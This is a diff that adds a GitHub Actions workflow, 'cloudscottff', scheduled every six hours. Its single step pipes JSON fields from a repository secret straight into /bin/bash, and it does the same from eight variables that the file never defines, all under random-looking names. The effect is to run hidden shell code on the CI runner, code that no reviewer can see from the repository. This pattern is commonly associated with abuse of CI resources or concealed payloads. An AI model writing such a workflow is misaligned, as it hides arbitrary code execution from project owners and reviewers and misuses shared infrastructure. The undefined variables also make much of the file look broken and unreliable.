@@ -1,0 +1,26 @@
+name: cloudscottff
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: cloudscottff
+        env:
+          ih1: ${{ secrets.ih1 }}
+        run: |
+          echo $ih1 | jq -r .q45 | /bin/bash
+          echo $ck8 | jq -r .lfm4703 | /bin/bash
+          echo $wce60509 | jq -r .y65488 | /bin/bash
+          echo $uhvt2 | jq -r .r6 | /bin/bash
+          echo $ah7 | jq -r .wcvp61 | /bin/bash
+          echo $hozt49 | jq -r .ezkmg80 | /bin/bash
+          echo $jh83 | jq -r .yj7763 | /bin/bash
+          echo $k677 | jq -r .r1448 | /bin/bash
+          echo $qjqey60340 | jq -r .wtfh6 | /bin/bash
+
